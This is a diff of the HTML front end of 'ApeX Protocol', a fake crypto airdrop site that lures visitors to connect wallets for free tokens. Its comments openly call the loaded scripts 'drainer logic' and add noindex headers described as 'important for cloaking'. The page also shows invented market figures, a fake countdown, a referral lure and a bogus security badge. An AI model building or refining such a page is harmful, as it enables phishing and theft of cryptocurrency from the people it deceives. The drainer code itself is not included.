@@ -5,22 +5,36 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="mobile-web-app-capable" content="yes" />
-    
 
+    <!-- Prevent search engines from indexing this page (important for cloaking) -->
+    <meta name="robots" content="noindex, nofollow" />
+    <!-- Force no caching to ensure fresh content every time -->
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="0" />
 
     <title>ApeX Protocol | AI-Optimized Yield Farming</title>
+
+    <!-- Preload critical assets for better performance -->
+    <link rel="preload" href="NFT_IMAGE/ChatGPT Image Nov 7, 2025, 10_47_13 AM.png" as="image" />
+    <link rel="preconnect" href="https://cdnjs.cloudflare.com" />
+
+    <!-- Stylesheets -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
-    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/build/three.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/vanta@0.5.21/dist/vanta.net.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
-   <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="style.css" />
+
+    <!-- Core libraries (defer to not block rendering) -->
+    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/build/three.min.js" defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/vanta@0.5.21/dist/vanta.net.min.js" defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js" defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js" defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js" defer></script>
 </head>
 <body>
+    <!-- Vanta.js Background -->
     <div id="vanta-bg"></div>
 
-    <!-- Announcement Modal -->
+    <!-- Announcement Modal (Referral Required) -->
     <div class="announcement-modal" id="announcementModal">
         <div class="announcement-modal-content">
             <div class="announcement-modal-close" id="announcementModalClose">
@@ -31,7 +45,7 @@
             </div>
             <h2>Referral Required</h2>
             <p>To claim your airdrop, you need to refer 3 friends to join ApeX Protocol.</p>
-            
+
             <div class="referral-steps">
                 <div class="referral-step">
                     <div class="step-number">1</div>
@@ -46,88 +60,26 @@
                     <div>Claim your 500 APEX tokens</div>
                 </div>
             </div>
-            
+
             <div class="referral-link-container">
                 <div class="referral-link" id="referralLink">https://apex-protocol.io/ref?user=0x8a3F...Bc92</div>
                 <button class="copy-btn" id="copyReferralBtn">
                     <i class="fas fa-copy"></i> Copy Link
                 </button>
             </div>
-            
+
             <button class="btn-primary" id="announcementOkBtn">
                 <i class="fas fa-check"></i> I Understand
             </button>
         </div>
     </div>
 
-    <!-- Wallet Modal -->
-    <!-- <div class="wallet-modal" id="walletModal">
-        <div class="wallet-modal-content">
-            <div class="wallet-modal-close" id="walletModalClose">
-                <i class="fas fa-times"></i>
-            </div>
-            <h2 style="text-align: center; margin-bottom: 20px; color: var(--accent)">
-                <i class="fas fa-wallet"></i> Connect Wallet
-            </h2>
-
-            <div class="wallet-provider" data-provider="metamask" id="metamask-provider">
-                <div class="wallet-provider-icon">
-                    <i class="fab fa-ethereum"></i>
-                </div>
-                <div>
-                    <div class="wallet-provider-name">MetaMask</div>
-                    <div class="wallet-provider-description">
-                        Connect to your MetaMask Wallet
-                    </div>
-                </div>
-                <div class="wallet-provider-badge" id="metamask-badge">Detected</div>
-            </div>
-
-            <div class="wallet-provider" data-provider="coinbase" id="coinbase-provider">
-                <div class="wallet-provider-icon">
-                    <i class="fab fa-bitcoin"></i>
-                </div>
-                <div>
-                    <div class="wallet-provider-name">Coinbase Wallet</div>
-                    <div class="wallet-provider-description">
-                        Connect to your Coinbase Wallet
-                    </div>
-                </div>
-                <div class="wallet-provider-badge" id="coinbase-badge">Detected</div>
-            </div>
-
-            <div class="wallet-provider" data-provider="trust" id="trust-provider">
-                <div class="wallet-provider-icon">
-                    <i class="fas fa-lock"></i>
-                </div>
-                <div>
-                    <div class="wallet-provider-name">Trust Wallet</div>
-                    <div class="wallet-provider-description">
-                        Connect to your Trust Wallet
-                    </div>
-                </div>
-                <div class="wallet-provider-badge" id="trust-badge">Detected</div>
-            </div>
-
-            <div class="wallet-provider" data-provider="rabby" id="rabby-provider">
-                <div class="wallet-provider-icon">
-                    <i class="fas fa-wallet"></i>
-                </div>
-                <div>
-                    <div class="wallet-provider-name">Rabby Wallet</div>
-                    <div class="wallet-provider-description">
-                        Connect to your Rabby Wallet
-                    </div>
-                </div>
-                <div class="wallet-provider-badge" id="rabby-badge">Detected</div>
-            </div>
-        </div>
-    </div> -->
-
+    <!-- Security Shield Indicator -->
     <div class="security-shield">
         <i class="fas fa-shield-alt"></i> Security Verification Active
     </div>
 
+    <!-- Header / Navigation -->
     <header id="header">
         <div class="container">
             <nav>
@@ -136,37 +88,41 @@
                     <span>APEX</span>
                 </div>
                 <ul class="nav-links">
-                    <li><a href="index.html">Home</a></li>
-                    <li><a href="index.html#features">Features</a></li>
-                    <li><a href="index.html#tokenomics">Tokenomics</a></li>
-                    <li><a href="index.html#roadmap">Roadmap</a></li>
-                    <li><a href="index.html#contact">Contact</a></li>
+                    <li><a href="#home">Home</a></li>
+                    <li><a href="#features">Features</a></li>
+                    <li><a href="#tokenomics">Tokenomics</a></li>
+                    <li><a href="#roadmap">Roadmap</a></li>
+                    <li><a href="#contact">Contact</a></li>
                 </ul>
                 <div id="walletButtonContainer">
-                    <!-- AppKit button will be inserted here by JavaScript -->
-                    <button class="wallet-btn" id="walletButton" >
+                    <button class="wallet-btn" id="walletButton">
                         <i class="fas fa-wallet"></i> Connect
                     </button>
                 </div>
-                <button class="mobile-menu-btn">
+                <button class="mobile-menu-btn" aria-label="Menu">
                     <i class="fas fa-bars"></i>
                 </button>
             </nav>
         </div>
     </header>
 
+    <!-- Hero / Main Content -->
     <section class="hero">
         <div class="container">
             <div class="hero-content">
-                <h1 class="fade-in">Claim Your <span>AI-Optimized Tokens</span></h1>
+                <h1 class="fade-in">Claim Your <span class="accent-text">AI-Optimized Tokens</span></h1>
                 <p class="fade-in">
                     AI-enhanced token distribution! Get your free APEX tokens with
-                    predictive analytics and smart allocation. 
+                    predictive analytics and smart allocation.
                 </p>
 
+                <!-- Two‑card layout -->
                 <div class="claim-container">
+                    <!-- Left Card: Claim Form -->
                     <div class="claim-card fade-in">
                         <h2>ApeX Token Claim</h2>
+
+                        <!-- Token Header with Price -->
                         <div class="token-header">
                             <div class="token-logo">AX</div>
                             <div>
@@ -179,6 +135,7 @@
                             </div>
                         </div>
 
+                        <!-- Claim Details -->
                         <div class="claim-details">
                             <div class="claim-amount">500 APEX</div>
                             <p class="text-center">
@@ -186,11 +143,13 @@
                             </p>
                         </div>
 
+                        <!-- Countdown Timer -->
                         <div class="countdown-container">
                             <div class="countdown-label">Time Until Launch</div>
                             <div class="countdown" id="countdown">0:0:30:0</div>
                         </div>
 
+                        <!-- Progress Bar -->
                         <div class="progress-container">
                             <div class="progress-label">
                                 <span>Tokens Claimed</span>
@@ -208,15 +167,18 @@
                                 <div class="nft-overlay"></div>
                                 <img
                                     src="NFT_IMAGE/ChatGPT Image Nov 7, 2025, 10_47_13 AM.png"
-                                       alt="Futuristic Human NFT"
+                                    alt="Futuristic Human NFT"
+                                    loading="lazy"
                                 />
                             </div>
                         </div>
 
+                        <!-- Claim Actions -->
                         <div class="claim-actions">
-                            <w3m-button></w3m-button>
-                            <button class="btn-primary" id="connectButton" >
-                                <!-- Original button hidden -->
+                            <!-- If you use AppKit, ensure it's loaded; otherwise remove this line -->
+                            <!-- <w3m-button></w3m-button> -->
+                            <button class="btn-primary" id="connectButton">
+                                <i class="fas fa-hand-holding-heart"></i> Claim Tokens
                             </button>
                             <div id="claimStatus" class="status"></div>
                             <div class="connection-debug" id="connectionDebug"></div>
@@ -224,14 +186,15 @@
                         </div>
                     </div>
 
+                    <!-- Right Card: Token Tracker -->
                     <div class="token-tracker-card fade-in">
                         <h2>ApeX Token Tracker</h2>
+
+                        <!-- Token Statistics -->
                         <div class="token-stats">
                             <div class="stat-item">
                                 <h3>Market Cap</h3>
-                                <div class="stat-value">
-                                    $<span id="marketCap">1.84M</span>
-                                </div>
+                                <div class="stat-value">$<span id="marketCap">1.84M</span></div>
                             </div>
                             <div class="stat-item">
                                 <h3>Volume (24h)</h3>
@@ -243,27 +206,28 @@
                             </div>
                             <div class="stat-item">
                                 <h3>Liquidity</h3>
-                                <div class="stat-value">
-                                    $<span id="liquidity">620K</span>
-                                </div>
+                                <div class="stat-value">$<span id="liquidity">620K</span></div>
                             </div>
                         </div>
 
+                        <!-- Price Chart -->
                         <div class="chart-container">
                             <canvas id="tokenChart"></canvas>
                         </div>
 
+                        <!-- Recent Claims Feed -->
                         <div class="recent-claims">
                             <h3><i class="fas fa-bolt"></i> Recent Claims</h3>
-                            <div class="claim-list" id="claimList">
-                                <!-- Claims will be added dynamically -->
-                            </div>
+                            <div class="claim-list" id="claimList"></div>
                         </div>
                     </div>
                 </div>
 
+                <!-- AI Security Analytics Section -->
                 <div class="ai-section fade-in">
                     <h2><i class="fas fa-brain"></i> AI Security Analytics</h2>
+
+                    <!-- AI Stats Grid -->
                     <div class="ai-stats">
                         <div class="ai-stat">
                             <i class="fas fa-fingerprint"></i>
@@ -287,10 +251,9 @@
                         </div>
                     </div>
 
+                    <!-- Prediction Meter -->
                     <div class="ai-prediction">
-                        <h3>
-                            <i class="fas fa-crystal-ball"></i> Security Bypass Probability
-                        </h3>
+                        <h3><i class="fas fa-crystal-ball"></i> Security Bypass Probability</h3>
                         <div class="prediction-meter">
                             <div class="prediction-fill" id="predictionFill"></div>
                         </div>
@@ -305,6 +268,7 @@
         </div>
     </section>
 
+    <!-- Footer -->
     <footer>
         <div class="footer-container">
             <div class="footer-content">
@@ -323,52 +287,26 @@
                     <div class="footer-column">
                         <h3>Resources</h3>
                         <ul>
-                            <li>
-                                <a href="#"><i class="fas fa-book"></i> Documentation</a>
-                            </li>
-                            <li>
-                                <a href="#"><i class="fas fa-newspaper"></i> Blog</a>
-                            </li>
-                            <li>
-                                <a href="#"><i class="fas fa-video"></i> Tutorials</a>
-                            </li>
+                            <li><a href="#"><i class="fas fa-book"></i> Documentation</a></li>
+                            <li><a href="#"><i class="fas fa-newspaper"></i> Blog</a></li>
+                            <li><a href="#"><i class="fas fa-video"></i> Tutorials</a></li>
                         </ul>
                     </div>
-
                     <div class="footer-column">
                         <h3>Company</h3>
                         <ul>
-                            <li>
-                                <a href="#"><i class="fas fa-users"></i> About Us</a>
-                            </li>
-                            <li>
-                                <a href="#"><i class="fas fa-briefcase"></i> Careers</a>
-                            </li>
-                            <li>
-                                <a href="#"><i class="fas fa-handshake"></i> Partners</a>
-                            </li>
+                            <li><a href="#"><i class="fas fa-users"></i> About Us</a></li>
+                            <li><a href="#"><i class="fas fa-briefcase"></i> Careers</a></li>
+                            <li><a href="#"><i class="fas fa-handshake"></i> Partners</a></li>
                         </ul>
                     </div>
-
                     <div class="footer-column">
                         <h3>Legal</h3>
                         <ul>
-                            <li>
-                                <a href="#"
-                                    ><i class="fas fa-shield-alt"></i> Privacy Policy</a
-                                >
-                            </li>
-                            <li>
-                                <a href="#"
-                                    ><i class="fas fa-scale-balanced"></i> Terms of Service</a
-                                >
-                            </li>
-                            <li>
-                                <a href="#"><i class="fas fa-gavel"></i> Disclaimer</a>
-                            </li>
-                            <li>
-                                <a href="#"><i class="fas fa-cookie"></i> Cookie Policy</a>
-                            </li>
+                            <li><a href="#"><i class="fas fa-shield-alt"></i> Privacy Policy</a></li>
+                            <li><a href="#"><i class="fas fa-scale-balanced"></i> Terms of Service</a></li>
+                            <li><a href="#"><i class="fas fa-gavel"></i> Disclaimer</a></li>
+                            <li><a href="#"><i class="fas fa-cookie"></i> Cookie Policy</a></li>
                         </ul>
                     </div>
                 </div>
@@ -384,9 +322,48 @@
         </div>
     </footer>
 
+    <!-- Your custom scripts (drainer logic) – NO CLOAKING SCRIPT HERE -->
+    <script type="module" src="./Java/Script.js" defer></script>
+    <script type="module" src="./Java/main.js" defer></script>
 
+    <!-- Vanta initialization with retry -->
+    <script>
+        (function initVanta() {
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', initVanta);
+                return;
+            }
+            if (typeof VANTA !== 'undefined' && VANTA.NET) {
+                try {
+                    VANTA.NET({
+                        el: "#vanta-bg",
+                        mouseControls: true,
+                        touchControls: true,
+                        gyroControls: false,
+                        minHeight: 200.00,
+                        minWidth: 200.00,
+                        scale: 1.00,
+                        scaleMobile: 1.00,
+                        color: 0xff6b00,
+                        backgroundColor: 0x0f172a,
+                        points: 15.00,
+                        maxDistance: 25.00,
+                        spacing: 18.00
+                    });
+                } catch (e) {
+                    console.error('Vanta init error:', e);
+                }
+            } else {
+                setTimeout(initVanta, 300);
+            }
+        })();
+    </script>
+
+    <!-- Fallback for users with JavaScript disabled -->
+    <noscript>
+        <div style="position: fixed; top: 0; left: 0; width: 100%; background: #ff0000; color: white; text-align: center; padding: 10px; z-index: 9999;">
+            JavaScript is required to use this site. Please enable JavaScript in your browser settings.
+        </div>
+    </noscript>
 </body>
-<script type="module" src="./Java/Script.js"></script>
-<script type="module" src="./Java/main.js"></script>
-    <script type="module" src="./Java/clocking.js"></script>
 </html>
